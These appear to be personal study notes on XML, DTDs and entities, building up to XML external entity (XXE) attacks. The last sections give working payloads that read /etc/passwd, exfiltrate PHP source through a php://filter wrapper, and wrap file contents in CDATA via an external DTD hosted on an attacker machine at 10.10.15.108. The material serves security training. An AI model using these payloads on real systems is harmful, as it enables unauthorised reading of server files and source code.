
## XML

- flexible transfer
- storage of data and documents
- formatted by tree structure



|Key|Definition|Example|
|---|---|---|
|`Tag`|The keys of an XML document, usually wrapped with (`<`/`>`) characters.|`<date>`|
|`Entity`|XML variables, usually wrapped with (`&`/`;`) characters.|`&lt;`|
|`Element`|The root element or any of its child elements, and its value is stored in between a start-tag and an end-tag.|`<date>01-01-2022</date>`|
|`Attribute`|Optional specifications for any element that are stored in the tags, which may be used by the XML parser.|`version="1.0"`/`encoding="UTF-8"`|
|`Declaration`|Usually the first line of an XML document, and defines the XML version and encoding to use when parsing it.|`<?xml version="1.0" encoding="UTF-8"?>`|


## XML DTD

- specify structure for server to respond 
- response by server is structured using DTD



- consider this ==scenario==
```
client => request(XML format to fetch resource) => server
server => responds(XML format) => client
```

- response of server
```
<?xml version="1.0"?>
<!DOCTYPE response SYSTEM "response.dtd"> <-- external dtd -->
<response>
    <status>200 OK</status>
    <data>
        <message>Welcome to our website!</message>
        <user>
            <name>John Doe</name>
            <email>john.doe@example.com</email>
        </user>
    </data>
</response>

```
- response.dtd 

```
<!ELEMENT response (status, data)>
<!ELEMENT status (#PCDATA)>
<!ELEMENT data (message, user)>
<!ELEMENT message (#PCDATA)>
<!ELEMENT user (name, email)>
<!ELEMENT name (#PCDATA)>
<!ELEMENT email (#PCDATA)>

```


- client can verify the response using DTD specfied in DOCTYPE declaration => accessible via url (external dtd)
- structure specified in response itself(internal dtd)
- ==why client validate?== => data integrity


## XML Entities


 - XML variables
 - reduce repetitive data
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```

- use `&company;` to replace values of variables

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "http://localhost/company.txt">
  <!ENTITY signature SYSTEM "file:///var/www/html/signature.txt">
]>
```


- the above are external entities


# Local File Disclosure


- take external entities in account
- test internal entity => check value reflected in response

![[Pasted image 20240710194541.png]]


- internal entity success move to reference external entity (`/etc/passwd`)
- use `system` keyword to fetch system files

![[Pasted image 20240710194715.png]]


# Reading Source Code

![[Pasted image 20240710194832.png]]

- ==not displayed why??== => not in a proper XML format (may contain xml spcl chars)

![[Pasted image 20240710194939.png]]

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```

==php filter woks only php backend application==



- **what if other technologies used in backend?**
	- cant use php filter to extract data ( using because of xml format breakage )
	- To output data that does not conform to the XML format wrap the content of the external file reference with a `CDATA` tag (<`![CDATA[ FILE_CONTENT ]]>`)
	-  `begin` internal entity with `<![CDATA[`, an `end` internal entity with `]]>`
	- place between `begin` and `end`


```xml
<!DOCTYPE email [
  <!ENTITY begin "<![CDATA[">
  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY end "]]>">
  <!ENTITY % xxe SYSTEM "http://10.10.15.108:8000/xxe.dtd"> <!-- reference our external DTD -->
  %xxe;
]>

....

<email>&joined;</email>
```

add xxe.dtd contents as entity reference

```shell-session
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
python3 -m http.server 8000
```



